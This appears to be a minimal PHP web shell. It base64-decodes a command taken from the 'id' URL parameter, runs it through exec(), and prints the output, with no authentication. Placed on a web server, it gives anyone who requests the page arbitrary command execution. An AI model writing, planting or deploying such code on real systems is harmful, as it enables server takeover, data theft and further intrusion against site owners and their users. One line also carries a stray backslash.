<?php
    $decoded_command = base64_decode($_GET['id']);
    echo "<b>Executed:</b>  $decoded_command";
    echo str_repeat("<br>",2);
    exec($decoded_command . " 2>&1", $output, $return_status);

        if ($return_status !== 0){
            echo "<font color='red'>Error in Code Execution -->  </font>";
            foreach ($output as &$line) {
                echo "$line <br>";
            }
		}
        elseif ($return_status == 0 && empty($output)){
            echo "<font color='green'>Command ran successfully, but does not have any output.</font>";\
		}
        else{
            foreach ($output as &$line) {
                echo "$line <br>";
            }
		}
	
	
?>

